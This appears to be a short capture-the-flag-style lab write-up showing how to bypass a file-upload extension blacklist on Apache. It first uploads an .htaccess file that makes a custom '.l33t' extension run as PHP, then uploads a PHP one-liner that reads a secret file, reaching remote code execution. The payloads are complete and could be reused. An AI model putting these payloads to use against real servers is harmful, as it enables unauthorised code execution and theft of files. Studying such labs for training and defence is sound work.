# Lab04 - Extension Blacklist Bypass

## Objective

Read:

```text
/home/carlos/secret
```

---

# Analysis

Application blocks:

```text
.php
```

but Apache supports:

```text
.htaccess
```

---

# Full Payload Used

### Payload 1

File:

```text
.htaccess
```

Contents:

```apache
AddType application/x-httpd-php .l33t
```

---

### Payload 2

Filename:

```text
exploit.l33t
```

Contents:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

Visit:

```text
/files/avatars/exploit.l33t
```

Lab solved.

---

# Why It Works

```text
.htaccess Uploaded
        ↓
Apache Config Modified
        ↓
.l33t Interpreted As PHP
        ↓
RCE
```

---

# Related Theory

- 09-overriding-server-configuration.md

---

# Key Learnings

Configuration files can become attack vectors.